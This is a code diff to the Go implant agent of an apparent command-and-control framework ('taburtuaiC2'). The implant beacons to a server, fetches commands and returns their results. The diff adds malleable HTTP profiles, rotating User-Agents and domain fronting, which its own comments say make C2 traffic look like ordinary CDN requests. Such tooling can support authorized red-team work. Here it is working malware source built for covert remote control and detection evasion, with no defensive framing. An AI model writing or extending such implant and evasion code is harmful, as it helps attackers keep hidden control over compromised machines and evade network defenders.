@@ -12,6 +12,7 @@ import (
 	"time"
 
 	"github.com/mjopsec/taburtuaiC2/pkg/crypto"
+	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
 	"github.com/mjopsec/taburtuaiC2/pkg/types"
 )
 
@@ -40,6 +41,13 @@ type AgentConfig struct {
 	// Execution method baked in at build time
 	// Supported: direct | cmd | powershell | wmi | mshta
 	ExecMethod string
+
+	// Malleable HTTP profile — controls URIs, headers, and User-Agent pool.
+	Profile *profiles.C2Profile
+
+	// Domain fronting — overrides the HTTP Host header while the TCP connection
+	// still goes to ServerURL (the CDN front). Empty = no fronting.
+	FrontDomain string
 }
 
 // Agent is the main implant runtime
@@ -154,7 +162,7 @@ func (a *Agent) Checkin() error {
 		return err
 	}
 
-	req, err := http.NewRequest("POST", a.cfg.ServerURL+"/api/v1/checkin", bytes.NewBuffer(body))
+	req, err := http.NewRequest("POST", a.cfg.ServerURL+a.profile().CheckinPath, bytes.NewBuffer(body))
 	if err != nil {
 		return err
 	}
@@ -194,7 +202,7 @@ func (a *Agent) Checkin() error {
 
 // GetNextCommand polls the server for the next pending command
 func (a *Agent) GetNextCommand() (*types.Command, error) {
-	url := fmt.Sprintf("%s/api/v1/command/%s/next", a.cfg.ServerURL, a.ID)
+	url := a.cfg.ServerURL + a.profile().CommandPathForAgent(a.ID)
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return nil, err
@@ -261,7 +269,7 @@ func (a *Agent) SubmitResult(result *types.CommandResult) error {
 		return err
 	}
 
-	req, err := http.NewRequest("POST", a.cfg.ServerURL+"/api/v1/command/result", bytes.NewBuffer(body))
+	req, err := http.NewRequest("POST", a.cfg.ServerURL+a.profile().ResultPath, bytes.NewBuffer(body))
 	if err != nil {
 		return err
 	}
@@ -408,14 +416,45 @@ func (a *Agent) marshalPayload(v any) ([]byte, error) {
 	return wrapped, nil
 }
 
-// setHeaders applies realistic HTTP headers; rotates User-Agent if enabled
+// profile returns the active C2Profile, falling back to Default if unset.
+func (a *Agent) profile() *profiles.C2Profile {
+	if a.cfg.Profile != nil {
+		return a.cfg.Profile
+	}
+	return profiles.Default()
+}
+
+// setHeaders applies the active profile's Content-Type, static headers, and
+// User-Agent to req, then lets the evasion manager add further obfuscation.
 func (a *Agent) setHeaders(req *http.Request) {
-	req.Header.Set("Content-Type", "application/json")
+	p := a.profile()
+
+	ct := p.ContentType
+	if ct == "" {
+		ct = "application/json"
+	}
+	req.Header.Set("Content-Type", ct)
 	req.Header.Set("Accept", "application/json")
-	if a.evasion != nil {
+
+	// Apply profile-specific static headers
+	for k, v := range p.Headers {
+		req.Header.Set(k, v)
+	}
+
+	// User-Agent: profile pool > evasion manager > hardcoded fallback
+	if len(p.UserAgents) > 0 {
+		req.Header.Set("User-Agent", p.UserAgents[int(time.Now().UnixNano())%len(p.UserAgents)])
+	} else if a.evasion != nil {
 		a.evasion.ObfuscateHTTPTraffic(req)
 	} else {
 		req.Header.Set("User-Agent",
 			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	}
+
+	// Domain fronting: override HTTP Host header so the CDN routes the request
+	// to the real C2 backend while the TLS SNI shows only the front domain.
+	// req.Host takes precedence over the URL's host for the Host header.
+	if a.cfg.FrontDomain != "" {
+		req.Host = a.cfg.FrontDomain
 	}
 }
